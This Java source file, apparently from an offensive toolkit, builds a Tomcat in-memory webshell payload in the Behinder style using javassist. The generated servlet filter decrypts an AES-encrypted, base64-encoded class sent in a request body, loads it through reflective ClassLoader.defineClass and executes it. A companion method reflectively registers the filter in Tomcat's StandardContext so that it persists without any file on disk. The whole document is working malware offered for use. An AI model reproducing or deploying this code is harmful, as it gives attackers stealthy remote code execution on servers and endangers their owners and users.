package cn.safe6.payload.memshell;

import javassist.*;
import org.apache.coyote.RequestInfo;

import javax.servlet.Filter;
import javax.servlet.jsp.PageContext;
import java.math.BigInteger;
import java.security.MessageDigest;

public class Behinder4 {



    public static byte[] getMemBehinder3Payload(String pass,String path) throws Exception {

        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(Filter.class));
        classPool.insertClassPath(new ClassClassPath(RequestInfo.class));
        classPool.insertClassPath(new ClassClassPath(PageContext.class));
        classPool.insertClassPath(new ClassClassPath(Behinder4.class));

        String cname = "MemBehinder3"+ System.nanoTime();
        CtClass ctClass = classPool.makeClass(cname);
        if (ctClass.getDeclaredConstructors().length != 0) {
            ctClass.removeConstructor(ctClass.getDeclaredConstructors()[0]);
        }
        ctClass.setInterfaces(new CtClass[]{classPool.getCtClass(Filter.class.getName())});
        ctClass.addField(CtField.make("public String passwd = \"" + pass + "\";", ctClass));
        ctClass.addField(CtField.make("public String tpath = \"" + path + "\";", ctClass));
        ctClass.addField(CtField.make("public String cs = \"UTF-8\";", ctClass));
        ctClass.addField(CtField.make("public javax.servlet.http.HttpServletRequest request = null;", ctClass));
        ctClass.addField(CtField.make("public javax.servlet.http.HttpServletResponse response = null;", ctClass));


        ctClass.addConstructor(CtNewConstructor.make("    public MemBehinder3(){}", ctClass));

        ctClass.addMethod(CtMethod.make("public void init(javax.servlet.FilterConfig filterConfig) throws javax.servlet.ServletException {\n" +
                "    }", ctClass));

        ctClass.addMethod(CtMethod.make("    public static String md5(String s) {\n" +
                "        String ret = null;\n" +
                "        try {\n" +
                "            java.security.MessageDigest m;\n" +
                "            m = java.security.MessageDigest.getInstance(\"MD5\");\n" +
                "            m.update(s.getBytes(), 0, s.length());\n" +
                "            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();\n" +
                "        } catch (Exception e) {}\n" +
                "        return ret.substring(0,16).toLowerCase();\n" +
                "    }", ctClass));


        ctClass.addMethod(CtMethod.make("    public void parseObj(Object obj) {\n" +
                "        if (obj.getClass().isArray()) {\n" +
                "            Object[] data = (Object[])((Object[])obj);\n" +
                "            this.request = (javax.servlet.http.HttpServletRequest)data[0];\n" +
                "            this.response = (javax.servlet.http.HttpServletResponse)data[1];\n" +
                "        } else {\n" +
                "            try {\n" +
                "                Class clazz = Class.forName(\"javax.servlet.jsp.PageContext\");\n" +
                "                this.request = (javax.servlet.http.HttpServletRequest)clazz.getDeclaredMethod(\"getRequest\",null).invoke(obj,null);\n" +
                "                this.response = (javax.servlet.http.HttpServletResponse)clazz.getDeclaredMethod(\"getResponse\",null).invoke(obj,null);\n" +
                "            } catch (Exception var8) {\n" +
                "                if (obj instanceof javax.servlet.http.HttpServletRequest) {\n" +
                "                    this.request = (javax.servlet.http.HttpServletRequest)obj;\n" +
                "\n" +
                "                    try {\n" +
                "                        java.lang.reflect.Field req = this.request.getClass().getDeclaredField(\"request\");\n" +
                "                        req.setAccessible(true);\n" +
                "                        javax.servlet.http.HttpServletRequest request2 = (javax.servlet.http.HttpServletRequest)req.get(this.request);\n" +
                "                        java.lang.reflect.Field resp = request2.getClass().getDeclaredField(\"response\");\n" +
                "                        resp.setAccessible(true);\n" +
                "                        this.response = (javax.servlet.http.HttpServletResponse)resp.get(request2);\n" +
                "                    } catch (Exception var7) {\n" +
                "                        try {\n" +
                "                            this.response = (javax.servlet.http.HttpServletResponse)this.request.getClass().getDeclaredMethod(\"getResponse\",null).invoke(obj,null);\n" +
                "                        } catch (Exception var6) {\n" +
                "                        }\n" +
                "                    }\n" +
                "                }\n" +
                "            }\n" +
                "        }"+
                "    }", ctClass));

        ctClass.addMethod(CtMethod.make("    public void doFilter(javax.servlet.ServletRequest servletRequest, javax.servlet.ServletResponse servletResponse, javax.servlet.FilterChain filterChain) throws java.io.IOException, javax.servlet.ServletException {\n" +
                "\n" +
                "        javax.servlet.http.HttpServletRequest request = (javax.servlet.http.HttpServletRequest) servletRequest;\n" +
                "        javax.servlet.http.HttpServletResponse response = (javax.servlet.http.HttpServletResponse) servletResponse;\n" +
                "        javax.servlet.http.HttpSession session = request.getSession();\n" +
                "                java.util.Map obj = new java.util.HashMap();\n" +
                        "        obj.put(\"request\", request);\n" +
                        "        obj.put(\"response\", response);\n" +
                        "        obj.put(\"session\", session);\n"+
                "             //  java.lang.System.out.println(111);\n" +
                "           // response.setHeader(\"inject\", \"success\");\n" +
                "            String k = md5(passwd);\n" +
                "            session.putValue(\"u\", k);\n" +
                "            // 回显密钥\n" +
                "            try{\n" +
                "                javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(\"AES\");\n" +
                "                javax.crypto.spec.SecretKeySpec sec = new javax.crypto.spec.SecretKeySpec(k.getBytes(), \"AES\");\n" +
                "                c.init(2, sec);\n" +
                "                String upload = request.getReader().readLine();\n" +
                "                java.lang.reflect.Method method = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", new Class[]{byte[].class,int.class, int.class});\n" +
                "                method.setAccessible(true);\n" +
                "                byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(upload));\n" +
                "                Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), new Object[]{evilclass_byte,new Integer(0), new Integer(evilclass_byte.length)});\n" +
                "                evilclass.newInstance().equals(obj);\n" +
                "            }catch (Exception e){\n" +
                "               e.printStackTrace();\n" +
                "            }\n" +
                "        filterChain.doFilter(request, response);\n" +
                "    }", ctClass));

        ctClass.addMethod(CtMethod.make("    public void destroy() {\n" +
                "    }", ctClass));



        ctClass.addMethod(CtMethod.make("    public static String addFilter(javax.servlet.Filter filter, String name, String url, javax.servlet.http.HttpServletRequest request) throws IllegalAccessException {\n" +
                "        javax.servlet.ServletContext servletContext = request.getServletContext();\n" +
                "        if (servletContext.getFilterRegistration(name) == null) {\n" +
                "            java.lang.reflect.Field contextField = null;\n" +
                "            org.apache.catalina.core.ApplicationContext applicationContext = null;\n" +
                "            org.apache.catalina.core.StandardContext standardContext = null;\n" +
                "            java.lang.reflect.Field stateField = null;\n" +
                "            javax.servlet.FilterRegistration.Dynamic filterRegistration = null;\n" +
                "            String var11=\"\";" +
                "            try {\n" +
                "                contextField = servletContext.getClass().getDeclaredField(\"context\");\n" +
                "                contextField.setAccessible(true);\n" +
                "                applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);\n" +
                "                contextField = applicationContext.getClass().getDeclaredField(\"context\");\n" +
                "                contextField.setAccessible(true);\n" +
                "                standardContext = (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);\n" +
                "                stateField = org.apache.catalina.util.LifecycleBase.class.getDeclaredField(\"state\");\n" +
                "                stateField.setAccessible(true);\n" +
                "                stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);\n" +
                "                filterRegistration = servletContext.addFilter(name, filter);\n" +
                "                filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false, new String[]{url});\n" +
                "                java.lang.reflect.Method filterStartMethod = org.apache.catalina.core.StandardContext.class.getMethod(\"filterStart\",null);\n" +
                "                filterStartMethod.setAccessible(true);\n" +
                "                filterStartMethod.invoke(standardContext, null);\n" +
                "                stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);\n" +
                "                Class filterMap;\n" +
                "                var11 = null;\n" +

                "                try {\n" +
                "                    filterMap = Class.forName(\"org.apache.tomcat.util.descriptor.web.FilterMap\");\n" +
                "                } catch (Exception var23) {\n" +
                "                    filterMap = Class.forName(\"org.apache.catalina.deploy.FilterMap\");\n" +
                "                }\n" +
                "\n" +
                "                java.lang.reflect.Method findFilterMaps = standardContext.getClass().getMethod(\"findFilterMaps\",null);\n" +
                "                Object[] filterMaps = (Object[])(findFilterMaps.invoke(standardContext,null));\n" +
                "                Object[] tmpFilterMaps = new Object[filterMaps.length];\n" +
                "                int index = 1;\n" +
                "\n" +
                "                for(int i = 0; i < filterMaps.length; i++) {\n" +
                "                    Object filterMapObj = filterMaps[i];\n" +
                "                    java.lang.reflect.Method findFilterName = filterMap.getMethod(\"getFilterName\",null);\n" +
                "                    String name1 = (String)findFilterName.invoke(filterMapObj,null);\n" +
                "                    if (name1.equalsIgnoreCase(name)) {\n" +
                "                        tmpFilterMaps[0] = filterMapObj;\n" +
                "                    } else {\n" +
                "                        tmpFilterMaps[index++] = filterMaps[i];\n" +
                "                    }\n" +
                "                }\n" +
                "\n" +
                "                System.arraycopy(tmpFilterMaps, 0, filterMaps, 0, filterMaps.length);\n" +
                "                return \"inject success\";\n"+
                "            } catch (Exception e) {\n" +
                "                   var11 = e.getMessage();\n" +
                "            } finally {\n" +
                "                stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);\n" +
                "            }\n" +
                "     return var11;    }\n" +
                "           else {\n" +
                "            return \"Filter already exists\";\n" +
                "        }"+
                "    }",ctClass));

        ctClass.addMethod(CtMethod.make("    public boolean equals(Object obj) {\n" +
                "        this.parseObj(obj);\n" +
                "        StringBuffer output = new StringBuffer();\n" +
                "\n" +
                "        try {\n" +
                "            this.response.setContentType(\"text/html\");\n" +
                "            this.request.setCharacterEncoding(this.cs);\n" +
                "            this.response.setCharacterEncoding(this.cs);\n" +
                "            output.append(this.addFilter(this,\"MemBehinder3\",this.tpath, this.request));\n" +
                "        } catch (Exception var7) {\n" +
                "            output.append(\"ERROR:// \" + var7.toString());\n" +
                "        }\n" +
                "\n" +
                "        try {\n" +
                "            this.response.getWriter().print(output.toString());\n" +
                "            this.response.getWriter().flush();\n" +
                "            this.response.getWriter().close();\n" +
                "        } catch (Exception var6) {\n" +
                "        }"+
                "        return true;\n" +
                "    }", ctClass));


        return ctClass.toBytecode();
    }

    public static String md5(String var0) {
        String var1 = null;

        try {
            MessageDigest var2 = MessageDigest.getInstance("MD5");
            var2.update(var0.getBytes(), 0, var0.length());
            var1 = (new BigInteger(1, var2.digest())).toString(16).toUpperCase();
        } catch (Exception var4) {
        }

        return var1.substring(0, 16).toLowerCase();
    }

}
